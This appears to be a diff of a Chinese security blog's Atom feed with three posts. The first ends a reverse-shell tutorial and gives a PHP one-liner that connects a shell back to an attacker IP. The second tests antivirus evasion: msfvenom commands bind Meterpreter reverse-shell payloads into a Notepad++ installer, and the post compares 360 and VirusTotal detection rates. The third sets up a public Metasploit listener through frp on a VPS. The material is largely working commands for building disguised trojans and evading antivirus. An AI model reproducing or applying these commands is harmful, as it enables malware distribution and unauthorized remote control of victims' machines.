+&lt;p&gt;如下图所示：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443651/Typera/2023/04/ff1cae7c81c0b04929f2c86b0e788c9e.png&#34; alt=&#34;image-20230426012727025&#34; /&gt;&lt;br /&gt;
+ 成功反弹 &lt;strong&gt;Shell&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443647/Typera/2023/04/6826b2f0cec7b82a3677a2e1e86de378.png&#34; alt=&#34;image-20230426012721830&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;用-php-脚本反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用-php-脚本反弹-shell&#34;&gt;#&lt;/a&gt; 用 php 脚本反弹 Shell&lt;/h2&gt;
+&lt;p&gt;攻击侧开启监听，目标机执行的 php 脚本如下：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &amp;#x27;$sock=fsockopen(&amp;quot;192.168.158.139&amp;quot;,23333);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 实现如下：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443639/Typera/2023/04/fdd3929e8cec1fc5e67af1614f47d9b4.png&#34; alt=&#34;image-20230426012715771&#34; /&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443627/Typera/2023/04/c830f507fd2cc729beb4e10b7a5d18cd.png&#34; alt=&#34;image-20230426012702683&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;最后&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#最后&#34;&gt;#&lt;/a&gt; 最后&lt;/h2&gt;
+&lt;p&gt;逐一实现了这么多的 &lt;strong&gt;反弹 Shell&lt;/strong&gt; 的方法，我发现他们本质上都是一致的。&lt;/p&gt;
+&lt;p&gt;无论是用工具还是脚本，都是 建立连接 + 输入输出重定向。&lt;/p&gt;
+&lt;p&gt;总得来说，这样一遍下来，最开始读起来较为模糊的原理，现在也能够清晰地理解了。&lt;/p&gt;
+</content>
+        <category term="Linux" />
+        <category term="Kali" />
+        <category term="Reverse Shell" />
+        <updated>2022-04-23T13:48:27.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/</id>
+        <title>免杀木马测试</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/"/>
+        <content type="html">&lt;div class=&#34;note default&#34;&gt;
+&lt;p&gt;&lt;strong&gt;测试杀软：360 全家桶&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 id=&#34;msf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf&#34;&gt;#&lt;/a&gt; MSF&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;mp_npp:&lt;/strong&gt;（2022/4/16）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &amp;gt; mp_npp.exe&lt;/code&gt; &lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;监听&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set payload windows/meterpreter/reverse_tcp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 192.168.158.139&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;免杀效果：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;不能完全通过 &lt;strong&gt;静态扫描&lt;/strong&gt;，快速扫描没事，指定文件夹扫描木马会报毒，且运行时会&lt;strong&gt;第一时间&lt;/strong&gt;检测出木马&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;40 /  70&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==&#34;&gt;检测报告&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;mp_rc4_npp_i15：&lt;/strong&gt;（2022/4/18）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 15 -f exe &amp;gt; mp_rc4_npp_i15.exe&lt;/code&gt; &lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;监听&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set payload windows/meterpreter/reverse_tcp_rc4&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 192.168.158.139&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;免杀效果：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;能过 &lt;strong&gt;360 静态检测&lt;/strong&gt;，但会被 &lt;strong&gt;动态检测&lt;/strong&gt; 查杀&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;38 /  70&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvODQzOTE0OTNkODJhNTg3OGYyYTJlYWE5NDY1ZTk1YjRlYWUwOWJjODQ4NmQ1MTRjYzE5YTc0MWIxOTE4NzIxYg==&#34;&gt;检测报告&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;sh_npp_i27：&lt;/strong&gt;（2022/4/18）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 27 -f exe &amp;gt; sh_npp_i27.exe&lt;/code&gt; &lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;监听&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set payload windows/shell_reverse_tcp_rc4&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 192.168.158.139&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;免杀效果：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;能过 &lt;strong&gt;360 静态检测&lt;/strong&gt;，但会被 &lt;strong&gt;动态检测&lt;/strong&gt; 查杀&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;35 /  69&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvMGE5NWQzOTBjODE2NWNmY2UxZGQ0Y2U0MDc2NGUyN2RiZmQ4OWJkMzk2YzZhMmE1OGFlNjYyZTYyM2FhNjIzMz9ub2NhY2hlPTE=&#34;&gt;检测报告&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;shellter-捆绑免杀&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellter-捆绑免杀&#34;&gt;#&lt;/a&gt; shellter 捆绑免杀&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;shellter_npp：&lt;/strong&gt;（2022/4/16）
+&lt;ul&gt;
+&lt;li&gt;payload 选择 &lt;strong&gt;shellter 自带&lt;/strong&gt;的：Meterpreter_Reverse_TCP （选项 1）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;免杀效果：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;能过 &lt;strong&gt;360 静态检测&lt;/strong&gt;，&lt;strong&gt;动态检测&lt;/strong&gt; 报毒会有 &lt;strong&gt;大约一分钟&lt;/strong&gt; 的延迟（时间上足够&lt;strong&gt;迁移进程&lt;/strong&gt; +&lt;strong&gt; 布置后门&lt;/strong&gt;）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;31 /  70&lt;/strong&gt;）&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==&#34;&gt;检测报告&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="Linux" />
+        <category term="Kali" />
+        <category term="Trojan horse" />
+        <category term="Metasploit" />
+        <category term="shellter" />
+        <updated>2022-04-18T12:48:36.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/</id>
+        <title>frp 搭建公网 Metasploit</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/"/>
+        <content type="html">&lt;h2 id=&#34;准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备&#34;&gt;#&lt;/a&gt; 准备&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;frps&lt;/strong&gt; 部署机。
+&lt;ul&gt;
+&lt;li&gt;要求：拥有 &lt;strong&gt;公网 IP&lt;/strong&gt; （例如 &lt;strong&gt;VPS&lt;/strong&gt;、云服务器等等）&lt;/li&gt;
+&lt;li&gt;本文选用 &lt;strong&gt;Ubuntu 18.04.6&lt;/strong&gt; 云服务器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;frpc&lt;/strong&gt; 客户机。
+&lt;ul&gt;
+&lt;li&gt;要求：能访问互联网&lt;/li&gt;
+&lt;li&gt;本文选用 &lt;strong&gt;Kali Linux 2022&lt;/strong&gt; 虚拟机&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;frp&lt;/strong&gt; 的 &lt;strong&gt;Github&lt;/strong&gt; 项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==&#34;&gt;fatedier/frp&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;frps云服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#frps云服务器&#34;&gt;#&lt;/a&gt; frps（云服务器）&lt;/h2&gt;
+&lt;h3 id=&#34;下载安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载安装&#34;&gt;#&lt;/a&gt; 下载安装&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/fatedier/frp&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt; 项目&lt;/a&gt; 上找到最新的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==&#34;&gt;releases&lt;/span&gt; ：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442796/Typera/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png&#34; alt=&#34;image-20230426011312770&#34; /&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在 &lt;strong&gt;云服务器&lt;/strong&gt; 终端上下载： &lt;code&gt;wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442806/Typera/2023/04/d8b546285137f60d42fef4a27a06d821.png&#34; alt=&#34;image-20230426011322302&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;解压缩&lt;/strong&gt; 下载的文件： &lt;code&gt;tar -zxvf frp_0.41.0_linux_amd64.tar.gz&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442811/Typera/2023/04/4063a698f14734b0fb54a92974122ba5.png&#34; alt=&#34;image-20230426011327257&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;进入&lt;/strong&gt; 解压缩的文件夹： &lt;code&gt;cd frp_0.41.0_linux_amd64/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;因为配置的是 &lt;strong&gt;frps&lt;/strong&gt; ，可以 &lt;strong&gt;删除&lt;/strong&gt; 文件夹内的 &lt;strong&gt;frpc&lt;/strong&gt; 相关文件，防止后续修改出错：&lt;strong&gt; &lt;code&gt;rm -rf frpc*&lt;/code&gt; &lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442816/Typera/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png&#34; alt=&#34;image-20230426011332064&#34; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;编写-frps-配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写-frps-配置文件&#34;&gt;#&lt;/a&gt; 编写 frps 配置文件&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;vim frps.ini&lt;/code&gt; &lt;br /&gt;
+ 内容如下：&lt;br /&gt;
+（不想要&lt;strong&gt;监控页面&lt;/strong&gt;的话，删除对应配置所在 &lt;strong&gt;行&lt;/strong&gt; 即可）&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[common]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bind_port = 7777          # frps和frpc的通讯端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dashboard_port = 9999     # web监控页面的端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dashboard_user = Sycamore # 登录监控页面的用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dashboard_pwd = 123456    # 登录监控页面的密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 如图所示：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442822/Typera/2023/04/02f8cca9459920e2f031c95fec4c172e.png&#34; alt=&#34;image-20230426011338410&#34; /&gt;&lt;br /&gt;
+（需要 &lt;strong&gt;云服务器&lt;/strong&gt; 打开 &lt;strong&gt;对应端口&lt;/strong&gt;：7777、9999)&lt;/p&gt;
+&lt;h3 id=&#34;运行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#运行&#34;&gt;#&lt;/a&gt; 运行&lt;/h3&gt;
+&lt;p&gt;相关命令 &lt;strong&gt;基本上&lt;/strong&gt; 应当在 &lt;strong&gt;frp_0.41.0_linux_amd64 文件夹&lt;/strong&gt; 下执行～&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;命令行输入： &lt;code&gt;./frps -c frps.ini&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;[注意]&lt;/strong&gt;：关闭命令行窗口，或是停止执行该命令，就会 &lt;strong&gt;退出&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;后台运行： &lt;code&gt;nohup ./frps -c frps.ini &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;因为通常不会 &lt;strong&gt;关闭云服务器&lt;/strong&gt;，所以 &lt;strong&gt;后台运行&lt;/strong&gt; 就足够了；&lt;/li&gt;
+&lt;li&gt;当然也可以 &lt;strong&gt;开启自启动&lt;/strong&gt;，详情见 &lt;strong&gt;frpc&lt;/strong&gt; 的内容，对应命令改个符号就行～&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;frpckali-虚拟机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#frpckali-虚拟机&#34;&gt;#&lt;/a&gt; frpc（Kali 虚拟机）&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442827/Typera/2023/04/692976286e5ddec8cd744326a1c3a54d.png&#34; alt=&#34;image-20230426011342973&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;下载安装-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载安装-2&#34;&gt;#&lt;/a&gt; 下载安装&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/fatedier/frp&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt; 项目&lt;/a&gt; 上找到最新的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==&#34;&gt;releases&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;步骤与 &lt;strong&gt;frps&lt;/strong&gt; 的几乎&lt;strong&gt;相同&lt;/strong&gt;，&lt;strong&gt;区别&lt;/strong&gt; 是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对象变成了 &lt;strong&gt;Kali 虚拟机&lt;/strong&gt;，而不是 云服务器&lt;/li&gt;
+&lt;li&gt;以及最后一步 &lt;strong&gt;删除的是 frps&lt;/strong&gt;：&lt;br /&gt;
+4. 因为配置的是 &lt;strong&gt;frpc&lt;/strong&gt; ，可以 &lt;strong&gt;删除&lt;/strong&gt; 文件夹内的 &lt;strong&gt;frps&lt;/strong&gt; 相关文件，防止后续修改出错：&lt;strong&gt; &lt;code&gt;rm -rf frps*&lt;/code&gt; &lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;编写-frpc-配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写-frpc-配置文件&#34;&gt;#&lt;/a&gt; 编写 frpc 配置文件&lt;/h3&gt;
+&lt;p&gt;作为一款 &lt;strong&gt;内网穿透&lt;/strong&gt; 工具，&lt;strong&gt;frp&lt;/strong&gt; 穿透了内网之后，还需要使用 &lt;strong&gt;其他手段&lt;/strong&gt;（&lt;strong&gt;ssh&lt;/strong&gt;）&lt;br /&gt;
+和外网建立交互，所以 &lt;strong&gt;配置文件&lt;/strong&gt; 中会存在 &lt;strong&gt;[ssh]&lt;/strong&gt; 配置。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;vim frpc.ini&lt;/code&gt; &lt;br /&gt;
+ 内容如下：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[common]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server_addr = 106.15.52.194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server_port = 7777&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ssh]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type = tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_ip = 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_port = 22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remote_port = 6666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use_compression = true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 相关 &lt;strong&gt;解释&lt;/strong&gt; 如图：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442834/Typera/2023/04/2144e375ff1aca162bb41868d050259f.png&#34; alt=&#34;image-20230426011350366&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;运行-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#运行-2&#34;&gt;#&lt;/a&gt; 运行&lt;/h3&gt;
+&lt;p&gt;相关命令 &lt;strong&gt;基本上&lt;/strong&gt; 应当在 &lt;strong&gt;frp_0.41.0_linux_amd64 文件夹&lt;/strong&gt; 下执行～&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;命令行输入： &lt;code&gt;./frpc -c frpc.ini&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;[注意]&lt;/strong&gt;：关闭命令行窗口，或是停止执行该命令，就会 &lt;strong&gt;退出&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;开机自启动：
+&lt;ul&gt;
+&lt;li&gt;服务目录 &lt;strong&gt;新建并编辑&lt;/strong&gt; 文件： &lt;code&gt;vim /lib/systemd/system/frp.service&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;填入以下内容：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[Unit]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Description=Frp Client Service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;After=network.target remote-fs.target nss-lookup.target&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Wants=network.target&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Service]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Type=simple&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ExecStart=/root/frp/frpc -c /root/frp/frpc.ini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Restart=always&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RestartSec=20s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Install]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WantedBy=multi-user.target&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;启动 &lt;strong&gt;frpc&lt;/strong&gt; 服务： &lt;code&gt;systemctl start frp&lt;/code&gt; &lt;br /&gt;
+（最后的  &lt;code&gt;frp&lt;/code&gt;  名称取决于上一步新建的文件名  &lt;code&gt;frp.service&lt;/code&gt; ）&lt;/li&gt;
+&lt;li&gt;打开 &lt;strong&gt;frpc&lt;/strong&gt; 服务自启动  &lt;code&gt;systemctl enable frp&lt;/code&gt; &lt;br /&gt;
+&lt;strong&gt; [注意]：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;如果要重启应用： &lt;code&gt;systemctl restart frp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;如果要停止应用： &lt;code&gt;systemctl stop frp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;如果要查看 &lt;strong&gt;frpc&lt;/strong&gt; 的日志： &lt;code&gt;systemctl status frp&lt;/code&gt;&lt;/li&gt;
